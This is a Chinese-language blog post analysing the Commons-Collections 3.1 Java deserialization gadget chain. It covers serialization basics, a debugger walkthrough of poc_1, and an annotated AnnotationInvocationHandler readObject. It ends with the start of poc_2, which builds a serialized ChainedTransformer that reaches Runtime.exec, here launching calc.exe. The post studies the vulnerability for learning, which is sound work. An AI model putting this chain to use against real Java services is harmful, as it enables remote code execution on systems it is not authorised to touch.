<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  
  <title>commons-collection1利用链分析 | 藏青&#39;s BLOG</title>

  
  <meta name="author" content="藏青">
  

  
  <meta name="description" content="知行合一">
  

  
  <meta name="keywords" content="渗透 内网 代码审计">
  

  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black">

  <meta property="og:title" content="commons-collection1利用链分析"/>

  <meta property="og:site_name" content="藏青&#39;s BLOG"/>

  
  <meta property="og:image" content="/favicon.ico"/>
  

  <link href="/favicon.ico" rel="icon">
  <link rel="alternate" href="/atom.xml" title="藏青&#39;s BLOG" type="application/atom+xml">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
<meta name="generator" content="Hexo 4.2.0"></head>


<body>
<div class="blog">
  <div class="content">

    <header>
  <div class="site-branding">
    <h1 class="site-title">
      <a href="/">藏青&#39;s BLOG</a>
    </h1>
    <p class="site-description"></p>
  </div>
  <nav class="site-navigation">
    <ul>
      
    </ul>
  </nav>
</header>

    <main class="site-main posts-loop">
    <article>

  
    
    <h3 class="article-title"><span>commons-collection1利用链分析</span></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2021/06/03/commons-collection1利用链分析/" rel="bookmark">
        <time class="entry-date published" datetime="2021-06-03T01:55:52.305Z">
          2021-06-03
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h4 id="1-序列化-与-反序列化"><a href="#1-序列化-与-反序列化" class="headerlink" title="1. 序列化 与 反序列化"></a>1. <strong>序列化 与 反序列化</strong></h4><ul>
<li><p><strong>定义</strong>：<strong><u>序列化</u></strong>指 将 <strong><u>对象/数据结构</u></strong>的<u><strong>状态</strong></u>信息 转换为可以<u><strong>存储</strong></u>或<u><strong>传输</strong></u>的形式的过程，其<u><strong>反</strong></u>过程称为<u><strong>反序列化</strong></u>。</p>
</li>
<li><p><strong>作用</strong>：</p>
<ul>
<li>将对象<u><strong>持久化</strong></u>到<u><strong>存储介质</strong></u>以便再次使用</li>
<li>使对象能在<u><strong>网络</strong></u>中传输</li>
<li>如序列化格式<u><strong>独立于语言</strong></u>，可以实现<u><strong>不同语言</strong></u>之间<u><strong>对象的传递</strong></u></li>
</ul>
<a id="more"></a>
</li>
<li><p><strong>常见形式</strong>：</p>
<ul>
<li>标准化格式：<ul>
<li>独立于语言/平台的格式：<ul>
<li>文本格式：xml，json等</li>
<li>二进制格式：protobuf等</li>
</ul>
</li>
<li>特定语言规定的格式：各类编程语言自带序列化格式（如java，python）</li>
</ul>
</li>
<li>私有格式：。。。</li>
</ul>
</li>
<li><p><strong>安全性思考</strong>：</p>
<ul>
<li><p>一切安全问题都产生于输入，这里的输入就是攻击端序列化好后的对象，被攻击端反序列化该对象。</p>
</li>
<li><p>大多数<strong><u>数据交换格式</u></strong>的实现中，序列化的对象<u><strong>仅可以包含属性</strong></u>，而<u><strong>不可以包含方法</strong></u>，所以<strong><u>不可能</u></strong>在序列化的过程中<strong><u>写入</u></strong>我们<strong><u>自己的代码</u></strong>，<strong><u>仅能控制</u></strong>对象的<strong><u>属性</u></strong>。</p>
<p><strong>ps.</strong> 反序列化端进程空间<strong><u>必须持有</u></strong>对象的<strong><u>类型信息和代码</u></strong>，否则无法正常的使用对象(如调用对象的方法)。</p>
</li>
<li><p>被攻击端反序列化该对象的<strong><u>过程中</u></strong>或者反序列化该对象<strong><u>之后</u></strong>执行了<strong><u>依赖该对象</u></strong>的代码，我们就可以一定程度<strong><u>通过</u></strong>对象的<strong><u>属性</u></strong>影响被攻击端程序的运行逻辑。</p>
</li>
<li><p>大多数<strong><u>数据交换格式</u></strong>的实现中，在对象反序列化的<strong><u>过程中</u></strong>，都会调用 默认的或该对象自定义的反序列化处理方法（如java中的ObjectInputStream.readObject 或 对象自定义的obj.readObject），所以反序列化漏洞大多出现在对象反序列化的<u><strong>过程中</strong></u>。</p>
</li>
</ul>
</li>
</ul>
<h4 id="2-common-collection-1利用链分析"><a href="#2-common-collection-1利用链分析" class="headerlink" title="2. common-collection-1利用链分析"></a>2. common-collection-1利用链分析</h4><blockquote>
<ul>
<li><p>The <a href="http://docs.oracle.com/javase/tutorial/collections/" target="_blank" rel="noopener">Java Collections Framework</a> was a major addition in JDK 1.2. It added many powerful data structures that accelerate development of most significant Java applications. Since that time it has become the recognised standard for collection handling in Java.</p>
<p>java collection 框架是jdk1.2 的主要补充，其增加了许多强大的数据结构，加速了大多数重要的java应用的开发。自那时起，它已经成为java处理集合的事实上的标准。</p>
</li>
<li><p><a href="https://commons.apache.org/proper/commons-collections/" target="_blank" rel="noopener">Commons-Collections</a> seek to build upon the JDK classes by providing new interfaces, implementations and utilities.</p>
<p>Common-Collections 通过提供新的接口，实现和工具(类)扩展了jdk 中java collection的功能。</p>
</li>
</ul>
</blockquote>
<p>漏洞分析环境：jdk1.7  ， commons-collections-3.1，Intellij IDEA</p>
<h5 id="poc-1"><a href="#poc-1" class="headerlink" title="poc_1"></a>poc_1</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//复制这段代码 运行并调试</span></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">poc_1</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//构造一个Transformer(转换器)数组</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod", new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;"getRuntime", new Class[0] &#125;),</span><br><span class="line">                new InvokerTransformer("invoke", new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;),</span><br><span class="line">                new InvokerTransformer("exec", new Class[] &#123;String.class &#125;, new Object[] &#123;"calc.exe"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//用Transformer数组实例化Transformer链</span></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建HashMap</span></span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">"value"</span>, <span class="string">"value"</span>);</span><br><span class="line">        <span class="comment">//为map绑定Transformer链，生成TransformedMap</span></span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//得到TransformedMap的一个Entry</span></span><br><span class="line">        Map.Entry onlyElement = (Map.Entry)outerMap.entrySet().iterator().next();</span><br><span class="line">        <span class="comment">//设置TransformedMap的Entry时会通过Transformer链对Value进行转换，转换过程依次执行Transformer链中的Transformer.transform方法，触发代码执行。</span></span><br><span class="line">        onlyElement.setValue(<span class="string">"foobar"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>poc_1  第34行打断点，运行(f9)</p>
<p><img src="/2021/06/03/commons-collection1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/1622366778178-1623304151021.png" alt="1622366778178"></p>
</li>
<li><p>step into (f7)</p>
<p><img src="/2021/06/03/commons-collection1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/1622366849023-1623304151021.png" alt="1622366849023"></p>
</li>
<li><p>step into (f7)</p>
<p><img src="/2021/06/03/commons-collection1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/1622366888331-1623304151022.png" alt="1622366888331"></p>
<p><img src="/2021/06/03/commons-collection1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/1622367177772-1623304151022.png" alt="1622367177772"></p>
<p><img src="/2021/06/03/commons-collection1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/1622366950973-1623304151022.png" alt="1622366950973"></p>
<p>valueTransformer类型为ChainedTransformer，其中包含1个ConstantTransformer，3个InvokerTransformer。然后调用了valueTransformer.transform对传入对象进行转换。</p>
</li>
<li><p>step into (f7)，第59行打断点</p>
<p><img src="/2021/06/03/commons-collection1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/1622368649810-1623304151022.png" alt="1622368649810"></p>
<p><img src="/2021/06/03/commons-collection1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/1622367738856-1623304151022.png" alt="1622367738856"></p>
<p>ChainedTransformer的iTransformers是一个Transformer数组，维护了其Transformer链。ChainedTransformer使用其维护的Transformer链上的Transformer依次对对象进行转换。每个Transformer.transform输入一个对象并返回转换后的对象，转换后的对象传给下一个Transformer直到所有Transformer处理完毕。</p>
</li>
<li><p>step into * 2 (f7 两次)，进入第一个Transformer(ConstantTransformer)的实现</p>
<p><img src="/2021/06/03/commons-collection1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/1622368399429-1623304151023.png" alt="1622368399429"></p>
<p><img src="/2021/06/03/commons-collection1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/1622368422967-1623304151023.png" alt="1622368422967"></p>
<p>返回java.lang.Runtime的class对象</p>
</li>
<li><p>运行(f9)，断在ChainedTransformer.transform的循环中</p>
<p><img src="/2021/06/03/commons-collection1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/1622370300500-1623304151023.png" alt="1622370300500"></p>
</li>
<li><p>step into(f7)，进入第二个Transformer(InvokerTransformer)的实现，运行到第61行(alt+f9)</p>
<p><img src="/2021/06/03/commons-collection1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/1622372409077-1623304151023.png" alt="1622372409077"></p>
<p><img src="/2021/06/03/commons-collection1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/1622370571481-1623304151023.png" alt="1622370571481"></p>
<p><img src="/2021/06/03/commons-collection1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/1622370687827-1623304151023.png" alt="1622370687827"></p>
<p>此Transformer输入对象是java.lang.Runtime类的class对象，调用class对象的getMethod方法获取到java.lang.Runtime.getRuntime方法，返回其Method对象。</p>
</li>
<li><p>61行打断点(由poc知，后续所有的Transformer都是InvokerTransformer)，f9两次，进入第三个Transformer(InvokerTransformer)实现</p>
<p><img src="/2021/06/03/commons-collection1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/1622427469533-1623304151023.png" alt="1622427469533"></p>
<p><img src="/2021/06/03/commons-collection1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/1622427399455-1623304151023.png" alt="1622427399455"></p>
<p>此Transformer输入对象是java.lang.Runtime.getRuntime方法的Method的对象，调用Method对象的invoke方法得到Runtime对象，返回Runtime对象。</p>
</li>
<li><p>f9两次，进入第四个Transformer(InvokerTransformer)实现</p>
<p><img src="/2021/06/03/commons-collection1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/1622428774757-1623304151023.png" alt="1622428774757"></p>
<p><img src="/2021/06/03/commons-collection1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/1622428798070-1623304151023.png" alt="1622428798070"></p>
<p><img src="/2021/06/03/commons-collection1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/1622428812562-1623304151023.png" alt="1622428812562"></p>
<p>此Transformer输入对象是Runtime对象，调用Runtime对象的exec方法弹出计算器。</p>
</li>
</ul>
<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><ul>
<li><p>TransformedMap对Map进行了增强，可以通过设置针对key/value的Transformer对将要存入Map的key/value对象进行转换。</p>
</li>
<li><p>Transformer是个接口，调用Transformer.transform方法可以对对象进行转换(传入要转换的对象，返回转换后的对象)，这里只关注其以下三种实现(<strong>三种实现均支持序列化!!!</strong>)</p>
<ul>
<li><p>ConstantTransformer，无论要转换的对象是什么，都返回一个<strong><u>固定</u></strong>的转换后的对象。</p>
</li>
<li><p>InvokerTransformer，<strong><u>调用</u></strong>要转换对象的一个<strong><u>成员方法</u></strong>，该成员方法返回转换后的对象。</p>
</li>
<li><p>ChainedTransformer，可以接受一个Transformer数组生成一个<strong><u>转换链</u></strong>。<strong><u>依次调用</u></strong>每个Transformer的transform方法对对象进行处理，<strong><u>前一个</u></strong>Transformer的<strong><u>输出对象</u></strong>作为<strong><u>后一个</u></strong>Transformer的<strong><u>输入</u></strong>。可以用ConstantTransformer初始化要转换的对象。</p>
</li>
</ul>
</li>
</ul>
<ul>
<li>如果想要<strong><u>调用</u></strong>一个<strong><u>对象的方法</u></strong>，可以定义一个ChainedTransformer。用ConstantTransformer<strong><u>初始化</u></strong>要转换的<strong><u>对象</u></strong>，用InvokerTransformer<strong><u>调用</u></strong>要转换<strong><u>对象的方法</u></strong>。定义ChainedTransformer<strong><u>只是定义</u></strong>了一个<strong><u>对象</u></strong>，其<strong><u>转换逻辑只有在</u></strong>TransformedMap 的<strong><u>key/value值被初始化或改变</u></strong>的时候才会<strong><u>触发</u></strong>(如poc_1对TransformedMap第一个Entry调用setValue方法触发转换逻辑)。</li>
</ul>
<h4 id="3-让目标程序执行恶意逻辑"><a href="#3-让目标程序执行恶意逻辑" class="headerlink" title="3. 让目标程序执行恶意逻辑"></a>3. 让目标程序执行恶意逻辑</h4><h5 id="能否在目标机运行poc-1中的恶意转换逻辑"><a href="#能否在目标机运行poc-1中的恶意转换逻辑" class="headerlink" title="能否在目标机运行poc_1中的恶意转换逻辑?"></a>能否在目标机运行poc_1中的恶意转换逻辑?</h5><ul>
<li><p>需要找一个合适的<strong><u>输入点</u></strong>，将poc_1中代码插入目标程序</p>
<p>但是<strong><u>一般</u></strong>情况下，<strong><u>很难有</u></strong>一个<strong><u>输入点</u></strong>可以让我们将自己的<strong><u>代码插入</u></strong>。即使有也不够通用，往往是一个命令执行的漏洞，如有一个groovy(groovy兼容java语法)命令执行的输入点(但都有命令执行了还看个泡泡茶壶=_=!)。</p>
</li>
<li><p>所以<strong><u>只能利用</u></strong>程序中<strong><u>已加载</u></strong>的<strong><u>代码</u></strong>，通过<strong><u>控制代码关联的数据间接控制</u></strong>代码的<strong><u>执行逻辑</u></strong></p>
<p>对java这种面向对象的语言来说，控制对象的<strong><u>属性</u></strong>就可以影响其方法的执行逻辑。有什么<strong><u>输入点</u></strong>可以比较方便的<strong><u>控制</u></strong>对象的<strong><u>属性</u></strong>？显然，反序列化（反序列化可以完全控制对象的属性，其他输入方式大多只能控制属性的一小部分字段）。如果目标程序存在反序列化输入点，我们就可以构造序列化好的对象发送给目标程序。</p>
</li>
<li><p>目标<strong><u>何时调用</u></strong>被反序列化的<strong><u>对象关联的代码</u></strong>?</p>
<ul>
<li><p>如果该对象的类<strong><u>重写</u></strong>了readObject方法，<strong><u>反序列化</u></strong>该对象的<strong><u>过程中会调用</u></strong>该对象的readObject方法。</p>
</li>
<li><p>反序列化对象<strong><u>以后</u></strong>，程序可能会使用反序列化后的对象，也<strong><u>可能</u></strong>调用其方法。</p>
</li>
</ul>
<p>显然，前种情况<strong><u>执行方法</u></strong>的<strong><u>时机</u></strong>更加<strong><u>稳定</u></strong>(反序列化<strong><u>过程中</u></strong>readObject<strong><u>必然被调用</u></strong>到)，后者<strong><u>执行方法</u></strong>的<strong><u>时机</u></strong>则非常<strong><u>依赖</u></strong>程序对反序列化后对象的<strong><u>使用的策略</u></strong>(例如：可能先将反序列化后的对象维护到一个全局数据结构，很久以后才用)。所以我们优先考虑第一种情况。</p>
</li>
<li><p>整理一下</p>
<p>攻击端序列化一个对象发送给目标程序，目标程序反序列化过程中调用此对象的readObject方法，readObject触发恶意逻辑。</p>
<p>由于readObject是目标程序定义的方法，我们无法修改，所以触发恶意逻辑的代码必须要尽可能的短，否则很难找到合适的反序列化输入点。</p>
<p>好在common-collection1链的触发逻辑就非常短，（例如对绑定了恶意ChainedTransformer的TransformedMap调用put方法，或对TransformedMap的Entry调用setValue方法等）。</p>
<p>因此，我们需要找一个<strong><u>漏洞触发类</u></strong>满足这样的条件：</p>
<ul>
<li>类在目标程序的代码空间里，且类可以序列化</li>
</ul>
</li>
</ul>
<ul>
<li><p>类中包含一个Map类型的属性，我们将其赋值为绑定了恶意ChainedTransformer的TransformedMap。</p>
<ul>
<li>其实现了readObject，readObject对Map属性（Map是一个接口，现在指向恶意TransformedMap）的key/value进行了更新(触发恶意逻辑)</li>
</ul>
<p>于是，<strong><u>攻击流程</u></strong>是这样（代码见poc_2，poc_2中漏洞触发类是AnnotationInvocationHandler）：</p>
<ul>
<li>攻击者实例化一个<strong><u>漏洞触发类</u></strong>的对象，将map字段填充为<strong><u>绑定了恶意</u></strong>ChainedTransformer的TransformedMap对象。序列化并发送给目标机。</li>
<li>目标收到并反序列化<strong><u>漏洞触发对象</u></strong>，调用readObject方法，对map字段的key/value进行更新，触发恶意的ChainedTransformer的转换逻辑，执行恶意代码。</li>
</ul>
<p>于是关键就是要找一个<strong><u>漏洞触发类</u></strong>，好在有巨佬(orz)已经找到了满足上述条件的类。</p>
</li>
</ul>
<h5 id="漏洞触发类AnnotationInvocationHandler"><a href="#漏洞触发类AnnotationInvocationHandler" class="headerlink" title="漏洞触发类AnnotationInvocationHandler"></a>漏洞触发类AnnotationInvocationHandler</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//poc_2中使用的漏洞触发类</span></span><br><span class="line"><span class="comment">//满足我们之前提到的漏洞触发类须满足的3个条件 1. 2. 3</span></span><br><span class="line"><span class="comment">//类的构造需要满足另外的条件(1)(2)...(6)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//1.此类在jdk中，必然会被加载，可序列化</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnnotationInvocationHandler</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class&lt;? extends Annotation&gt; type;</span><br><span class="line">    <span class="comment">//2.含有一个Map类型的属性，可以用构造方法对其赋值</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String, Object&gt; memberValues;</span><br><span class="line"></span><br><span class="line">    AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) &#123;</span><br><span class="line">        Class[] var3 = var1.getInterfaces();</span><br><span class="line">        <span class="comment">//(1)var1.isAnnotation(): 传入的var1是注解的class对象</span></span><br><span class="line">        <span class="comment">//(2)var3.length == 1: 该注解只实现了一个接口</span></span><br><span class="line">        <span class="comment">//(3)var3[0] == Annotation.class: 该注解了实现java.lang.annotation.Annotation接口</span></span><br><span class="line">        <span class="keyword">if</span> (var1.isAnnotation() &amp;&amp; var3.length == <span class="number">1</span> &amp;&amp; var3[<span class="number">0</span>] == Annotation<span class="class">.<span class="keyword">class</span>) </span>&#123;</span><br><span class="line">            <span class="comment">//将传入的注解的class对象赋值给this.type</span></span><br><span class="line">            <span class="keyword">this</span>.type = var1;</span><br><span class="line">            <span class="comment">//将传入的TransformedMap赋值给this.memberValues</span></span><br><span class="line">            <span class="keyword">this</span>.memberValues = var2;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> AnnotationFormatError(<span class="string">"Attempt to create proxy for a non-annotation type."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        var1.defaultReadObject();</span><br><span class="line">        AnnotationType var2 = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//获取传入注解关联的AnnotationType实例</span></span><br><span class="line">            var2 = AnnotationType.getInstance(<span class="keyword">this</span>.type);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalArgumentException var9) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">"Non-annotation type in annotation serial stream"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">		</span><br><span class="line">        <span class="comment">//通过AnnotationType实例获取注解接口信息。注解接口信息是Map类型，key是注解接口中的方法名，value是该方法的返回类型</span></span><br><span class="line">        Map var3 = var2.memberTypes();</span><br><span class="line">        Iterator var4 = <span class="keyword">this</span>.memberValues.entrySet().iterator();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(var4.hasNext()) &#123;</span><br><span class="line">            <span class="comment">//迭代获取传入的TransformedMap的Entry</span></span><br><span class="line">            Entry var5 = (Entry)var4.next();</span><br><span class="line">            <span class="comment">//获取Entry的key</span></span><br><span class="line">            String var6 = (String)var5.getKey();</span><br><span class="line">            <span class="comment">//通过Entry中的key在注解接口信息中获取注解接口中对应方法的返回类型</span></span><br><span class="line">            <span class="comment">//(4)Entry中的key必须也可以作为注解接口信息的key，即Entry的key必须等于注解接口的任一方法名（例如传入Target.class对象，那么TransformedMap的key必须是"value"）</span></span><br><span class="line">            Class var7 = (Class)var3.get(var6);</span><br><span class="line">            <span class="keyword">if</span> (var7 != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="comment">//获取Entry的value</span></span><br><span class="line">                Object var8 = var5.getValue();</span><br><span class="line">                <span class="comment">//(5)Entry的value不是拿到注解接口信息中对应方法的返回类型的实例</span></span><br><span class="line">                <span class="comment">//(6)Entry的value不是ExceptionProxy实例</span></span><br><span class="line">                <span class="keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                    <span class="comment">//3.实现了readObject方法，并在readObject方法中调用了对map value的更新方法，触发恶意转换逻辑</span></span><br><span class="line">                    var5.setValue((<span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy(var8.getClass() + <span class="string">"["</span> + var8 + <span class="string">"]"</span>)).setMember((Method)var2.members().get(var6)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以，将绑定了恶意ChainedTransformer的AnnotationInvocationHandler序列化发给目标程序即可。代码如下：</p>
<h5 id="poc-2"><a href="#poc-2" class="headerlink" title="poc_2"></a>poc_2</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">////复制这段代码 运行并调试</span></span><br><span class="line"><span class="keyword">package</span> com.company;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">poc_2</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//1.客户端构建攻击代码</span></span><br><span class="line">        <span class="comment">//构造一个Transformer(转换器)数组</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">               <span class="comment">//Runtime不可序列化，但是Class可以，具体逻辑简单分析即可</span></span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod", new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;"getRuntime", new Class[0] &#125;),</span><br><span class="line">                new InvokerTransformer("invoke", new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;),</span><br><span class="line">                new InvokerTransformer("exec", new Class[] &#123;String.class &#125;, new Object[] &#123;"calc.exe"&#125;)</span><br><span class="line">        &#125;;</span><br><span 